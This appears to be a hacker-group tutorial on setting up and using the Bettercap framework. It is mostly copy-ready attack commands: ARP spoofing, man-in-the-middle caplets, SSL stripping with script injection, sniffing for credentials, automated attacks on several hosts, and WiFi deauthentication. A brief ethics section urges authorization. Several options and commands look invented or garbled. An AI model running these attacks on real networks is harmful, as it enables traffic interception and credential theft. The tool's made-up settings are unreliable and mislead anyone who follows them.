# 🛠️ Bettercap Setup & Mastery Guide - 516 Hackers

## 🎯 What is Bettercap?
Bettercap is the Swiss Army knife for network attacks and monitoring. It's a powerful, modular, and portable framework written in Go that can be used for various types of network attacks and security assessments.

> **516 Note**: Bettercap is incredibly powerful - use it responsibly and only on networks you own or have explicit permission to test.

---

## 📦 Installation Guide

### Kali Linux (Pre-installed but update):
```bash
# Update to latest version
sudo apt update && sudo apt install bettercap -y

# Or install from source for latest features
sudo apt install golang git build-essential libpcap-dev libusb-1.0-0-dev libnetfilter-queue-dev
go get -u github.com/bettercap/bettercap
cd ~/go/src/github.com/bettercap/bettercap
make build
sudo make install
```

### Ubuntu/Debian:
```bash
# Download latest release
wget https://github.com/bettercap/bettercap/releases/download/v2.32/bettercap_linux_amd64_2.32.zip
unzip bettercap_linux_amd64_2.32.zip
sudo mv bettercap /usr/local/bin/
```

### Docker Installation:
```bash
# Run bettercap in Docker
docker run -it --net=host --rm bettercap/bettercap

# Or with persistent storage
docker run -it --net=host -v $(pwd)/bettercap-logs:/logs --rm bettercap/bettercap
```

### macOS:
```bash
# Using Homebrew
brew install bettercap

# Or download binary
curl -OL https://github.com/bettercap/bettercap/releases/download/v2.32/bettercap_darwin_amd64_2.32.zip
unzip bettercap_darwin_amd64_2.32.zip
sudo mv bettercap /usr/local/bin/
```

---

## ⚙️ Initial Configuration

### First Time Setup:
```bash
# Generate default configuration (run once)
sudo bettercap -eval "quit"

# Edit configuration file
sudo nano /usr/local/share/bettercap/caplets/bettercap.cap
```

### Essential Configuration Settings:
```bash
# Set default interface (replace with your interface)
set $ {iface}

# Network settings
set net.probe.throttle 50
set net.recon.mode passive

# API configuration (for web UI)
set api.rest.address 0.0.0.0
set api.rest.port 8081
set api.rest.username 516hacker
set api.rest.password SecurePass123!

# Events logging
set events.stream.output /tmp/bettercap-events.log
set events.stream.maxsize 10MB
```

### Verify Installation:
```bash
# Check version and capabilities
bettercap -version

# Check available interfaces
bettercap -iface any --check

# Test basic functionality
bettercap -iface eth0 -eval "help; quit"
```

---

## 🔧 Core Modules Overview

### Network Discovery Modules:

#### net.probe:
```bash
# Enable network probing
net.probe on

# Configure probe settings
set net.probe.throttle 10    # Packets per second
set net.probe.throttle.ms 0  # Milliseconds between packets

# Check status
net.probe
```

#### net.recon:
```bash
# Enable network reconnaissance
net.recon on

# Set reconnaissance mode
set net.recon.mode active    # Active scanning
set net.recon.mode passive   # Passive monitoring (stealth)

# View discovered hosts
net.show

# Get detailed info about specific host
get 192.168.1.100
```

### ARP Spoofing Module:
```bash
# Configure ARP spoofing
set arp.spoof.targets 192.168.1.100          # Single target
set arp.spoof.targets 192.168.1.100,192.168.1.101  # Multiple targets
set arp.spoof.targets 192.168.1.1/24         # Entire subnet

# Enable full duplex spoofing
set arp.spoof.fullduplex true

# Set spoofing method
set arp.spoof.forward true   # Forward packets (maintain connectivity)

# Start ARP spoofing
arp.spoof on

# Check status
arp.spoof
```

### Packet Sniffing Module:
```bash
# Configure packet sniffing
set net.sniff.local true          # Sniff local traffic
set net.sniff.output capture.pcap # Save to file
set net.sniff.source capture.pcap # Read from file
set net.sniff.regexp .*           # Filter by regex

# BPF filter support
set net.sniff.filter tcp port 80 or tcp port 443

# Start sniffing
net.sniff on

# Check status
net.sniff
```

---

## 🎪 Practical Sessions

### Session 1: Basic Network Reconnaissance
```bash
# Start bettercap on specific interface
sudo bettercap -iface eth0

# Enable discovery modules
net.probe on
net.recon on

# Wait for network discovery (30-60 seconds)
sleep 60

# View discovered hosts with details
net.show

# Export host list to file
net.show > hosts.txt

# Get detailed information about gateway
get 192.168.1.1
```

### Session 2: Man-in-the-Middle with Sniffing
```bash
sudo bettercap -iface eth0

# Phase 1: Discovery
net.probe on
net.recon on
sleep 30

# Phase 2: Identify target
net.show
# Note: Identify your target IP from the list

# Phase 3: ARP spoofing
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true
arp.spoof on

# Phase 4: Packet capture
set net.sniff.local true
set net.sniff.output mitm_capture.pcap
net.sniff on

# Phase 5: Monitor events
events.stream
```

### Session 3: Advanced Traffic Analysis
```bash
sudo bettercap -iface eth0

# Comprehensive setup for HTTP analysis
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true
set net.sniff.local true
set net.sniff.output http_traffic.pcap
set net.sniff.filter "tcp port 80"

arp.spoof on
net.sniff on

# Monitor in real-time
events.stream
```

---

## 📡 HTTP/HTTPS Proxying

### HTTP Proxy Setup:
```bash
# Configure HTTP proxy
set http.proxy.address 0.0.0.0
set http.proxy.port 8080
set http.proxy.injectjs /path/to/script.js  # JavaScript injection
set http.proxy.sslstrip true               # SSL stripping

# Start HTTP proxy
http.proxy on

# Check status
http.proxy
```

### HTTPS Proxy Setup:
```bash
# Configure HTTPS proxy
set https.proxy.address 0.0.0.0
set https.proxy.port 8081
set https.proxy.ssltrip true
set https.proxy.injectjs /path/to/script.js

# Start HTTPS proxy
https.proxy on

# Check status
https.proxy
```

### SSL Stripping Attack:
```bash
# Enable SSL stripping for both proxies
set http.proxy.sslstrip true
set https.proxy.sslstrip true

# Start both proxies
http.proxy on
https.proxy on

# Combined with ARP spoofing for full attack
set arp.spoof.targets 192.168.1.100
arp.spoof on
```

---

## 🎛️ Caplets - Bettercap's Superpower

### Using Built-in Caplets:
```bash
# List all available caplets
caplets.show

# Update caplets
caplet update.cap

# Popular built-in caplets:
caplet hstshijack/hstshijack     # HSTS hijacking
caplet sniff-unified.cap         # Unified sniffing
caplet arp-spoof.cap             # ARP spoofing automation
caplet dhcp6-spoof.cap           # DHCPv6 spoofing
```

### Create Custom Caplets:

#### Example 1: Basic Recon Caplet
Create file: `recon.cap`
```bash
# recon.cap - Basic network reconnaissance
echo "[*] Starting network reconnaissance..."
net.probe on
net.recon on
sleep 30
echo "[*] Network discovery completed"
net.show
events.stream
```

#### Example 2: Advanced MITM Caplet
Create file: `advanced-mitm.cap`
```bash
# advanced-mitm.cap - Complete MITM attack
echo "[*] Starting advanced MITM attack..."

# Network discovery
net.probe on
net.recon on
sleep 20

# ARP spoofing configuration
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true

# Sniffing configuration
set net.sniff.local true
set net.sniff.output advanced_mitm.pcap
set net.sniff.filter "tcp port 80 or tcp port 443"

# Proxy configuration
set http.proxy.sslstrip true
set https.proxy.sslstrip true

# Start attacks
arp.spoof on
net.sniff on
http.proxy on
https.proxy on

echo "[*] MITM attack running... Press Ctrl+C to stop"
events.stream
```

#### Run Custom Caplets:
```bash
# Run caplet
caplet recon.cap

# Run with parameters
caplet advanced-mitm.cap
```

---

## 🔍 Advanced Sniffing Techniques

### Selective Protocol Capture:
```bash
# Capture specific protocols only
set net.sniff.filter "tcp port 80 or tcp port 443 or tcp port 21 or tcp port 22"

# Capture excluding certain traffic
set net.sniff.filter "not arp and not dns"

# Complex BPF filters
set net.sniff.filter "host 192.168.1.100 and (tcp port 80 or tcp port 443)"

# Capture large files only
set net.sniff.filter "tcp and greater 1000"
```

### Real-time Analysis Configuration:
```bash
# Enable packet parsing in memory
set net.sniff.parser memory

# Limit packet capture size
set net.sniff.limit 5000

# Multiple output formats
set net.sniff.output capture.pcap
set net.sniff.report capture.html

# Verbose logging
set net.sniff.verbose true
```

### HTTP Data Extraction:
```bash
# Focus on HTTP traffic
set net.sniff.filter "tcp port 80"

# Extract specific data patterns
set net.sniff.regexp "(password|username|email)=[^&]+"

# Save credentials to file
set net.sniff.output http_credentials.pcap
```

---

## 📊 Event System & Logging

### Event Monitoring:
```bash
# Stream events to console in real-time
events.stream

# Show last N events
events.show 10

# Filter events by type
events.show 10 endpoint
events.show 10 packet
events.show 10 system

# Clear events
events.clear

# Save events to file
events.save /tmp/bettercap-events.log
```

### Comprehensive Logging Setup:
```bash
# Configure event logging
set events.stream.output /tmp/bettercap-session.log
set events.stream.maxsize 50MB
set events.stream.maxage 24h

# Enable different event types
set events.ignore endpoint.lost false
set events.ignore net.sniff.forwarded.frame false

# Start comprehensive logging
events.stream
```

### Custom Event Handlers:
```bash
# Create custom event reactions
set events.handlers.custom "if {event.Type == 'endpoint.new'} { log 'New endpoint: {event.Data.Name}' }"

# Enable custom handler
events.handlers on
```

---

## 🛡️ Defensive Configurations

### Stealth Mode Operations:
```bash
# Reduce network noise
set net.probe.throttle 10
set net.sniff.rate 50

# Use random MAC address
set $ {random_mac}

# Passive reconnaissance only
set net.recon.mode passive

# Disable unnecessary modules
net.probe off
```

### Evidence Collection:
```bash
# Comprehensive logging for evidence
set events.stream.output /tmp/evidence-$(date +%Y%m%d).log
set net.sniff.output /tmp/capture-$(date +%Y%m%d).pcap

# Timestamp all activities
events.stream

# Save session state
session.save investigation-$(date +%Y%m%d)
```

### Network Forensics Setup:
```bash
# Start forensic capture
set net.sniff.output forensic_capture.pcap
set net.sniff.local true
set net.sniff.filter "not arp"

# Log all network events
set events.stream.output network_events.log

net.sniff on
events.stream
```

---

## 🔧 Troubleshooting Common Issues

### Permission Issues:
```bash
# Error: "Operation not permitted"
# Solution: Run with sudo
sudo bettercap -iface eth0

# Error: "No such device"
# Solution: Check interface name
ip link show
bettercap -iface wlan0  # Use correct interface
```

### ARP Spoofing Problems:
```bash
# Issue: ARP spoofing not working
# Check target connectivity first
ping 192.168.1.100

# Verify IP forwarding is enabled
echo 1 > /proc/sys/net/ipv4/ip_forward

# Check if target is on same network
ip route get 192.168.1.100

# Test with different targets
set arp.spoof.targets 192.168.1.1  # Try gateway first
```

### Performance Issues:
```bash
# Enable debug mode for troubleshooting
sudo bettercap -iface eth0 -debug

# Reduce resource usage
set net.sniff.parser memory
set net.sniff.limit 1000

# Use capture filters instead of display filters
set net.sniff.filter "tcp port 80"
```

### Module-Specific Issues:
```bash
# Check module status and help
arp.spoof
help arp.spoof

# Reset module to defaults
arp.spoof off
set arp.spoof.targets ""
arp.spoof on

# Update to latest version
sudo apt update && sudo apt upgrade bettercap
```

---

## 📈 Performance Optimization

### Memory Management:
```bash
# Limit memory usage for packet parsing
set net.sniff.parser memory
set net.sniff.limit 1000

# Clear packet buffer periodically
set net.sniff.period 300  # Clear every 5 minutes

# Use file-based parsing for large captures
set net.sniff.parser file
```

### Network Optimization:
```bash
# Adjust network probe rate
set net.probe.throttle 50

# Limit host discovery
set net.recon.max-hosts 254

# Optimize packet processing
set net.sniff.rate 100    # Packets per second
set net.sniff.queue.size 1000
```

### Storage Optimization:
```bash
# Use ring buffer for captures
set net.sniff.output capture.pcap
set net.sniff.output.rotate true
set net.sniff.output.rotate.size 100MB
set net.sniff.output.rotate.max 10
```

---

## 🎯 Pro Tips & One-liners

### Quick Reconnaissance:
```bash
# One-liner for quick network scan
sudo bettercap -iface eth0 -eval "net.probe on; net.recon on; sleep 30; net.show; quit"
```

### Complete MITM Attack:
```bash
# Full attack in one command
sudo bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.100; set net.sniff.filter 'tcp port 80'; arp.spoof on; net.sniff on; events.stream"
```

### Stealthy Monitoring:
```bash
# Passive monitoring without ARP spoofing
sudo bettercap -iface eth0 -eval "set net.recon.mode passive; set net.sniff.local true; net.recon on; net.sniff on; events.stream"
```

### Session Management:
```bash
# Save current session
session.save my_session

# Load previous session
session.load my_session

# List all sessions
session.list

# Delete session
session.delete my_session
```

### Automated Attacks:
```bash
# Script multiple targets
for ip in 192.168.1.100 192.168.1.101 192.168.1.102; do
    sudo bettercap -iface eth0 -eval "set arp.spoof.targets $ip; arp.spoof on; net.sniff on; sleep 60; arp.spoof off; net.sniff off"
done
```

---

## ⚠️ Safety & Ethics

### Always Follow:
- ✅ Get explicit written permission
- ✅ Test only on owned networks
- ✅ Document all activities
- ✅ Clean up after testing
- ✅ Respect privacy and laws

### Never Do:
- ❌ Attack unauthorized networks
- ❌ Disrupt production systems
- ❌ Violate privacy laws
- ❌ Cause intentional damage
- ❌ Use for malicious purposes

### Legal Notice:
> **516 Ethics Code**: "With great power comes great responsibility. Bettercap is a tool for protection and education, not for harm. Always obtain proper authorization and use your skills ethically."

---

## 🚀 Next Level Techniques

### WiFi Attacks:
```bash
# WiFi reconnaissance (requires compatible adapter)
wifi.recon on
wifi.show

# Target specific access point
set wifi.ap.ttl 300
wifi.deauth AP:BSS:ID:HE:RE
```

### BLE (Bluetooth Low Energy):
```bash
# Bluetooth LE reconnaissance
ble.recon on
ble.show

# Enumerate BLE services
ble.enum MAC:AD:DR:ES:SX
```

### Advanced Caplet Development:
```bash
# Create interactive caplets with user input
echo "Enter target IP: "
read target
set arp.spoof.targets $target

# Conditional execution in caplets
if { $net.probe.state == "on" } {
    echo "Network probing is active"
}
```

---

## 📚 Additional Resources

### Official Documentation:
- [Bettercap GitHub](https://github.com/bettercap/bettercap)
- [Official Documentation](https://www.bettercap.org/)
- [Caplets Repository](https://github.com/bettercap/caplets)

### Community Resources:
- Bettercap Discord community
- Reddit: r/netsec
- Various security blogs and tutorials

### Practice Environments:
- Hack The Box machines
- TryHackMe networks
- Your own lab environment

---

## 🔄 Quick Reference Commands

### Essential Commands:
```bash
# Module control
module_name on/off        # Enable/disable module
module_name               # Show module status

# Network operations
net.probe on              # Enable host discovery
net.recon on              # Enable reconnaissance
net.show                  # Show discovered hosts

# Attack modules
arp.spoof on              # Start ARP spoofing
net.sniff on              # Start packet sniffing

# Monitoring
events.stream             # Real-time event monitoring
events.show N             # Show last N events

# Session management
session.save name         # Save session
session.load name         # Load session
```

### Common Filters:
```bash
# BPF filters for sniffing
"tcp port 80"             # HTTP traffic
"tcp port 443"            # HTTPS traffic
"udp port 53"             # DNS queries
"icmp"                    # ICMP packets
"not arp"                 # Exclude ARP
"host 192.168.1.100"      # Specific host
```

---

*"Knowledge is power, but ethics is the guidance system." - 516 Hackers*

---
*516 Hackers - Master Your Tools, Respect Your Power*

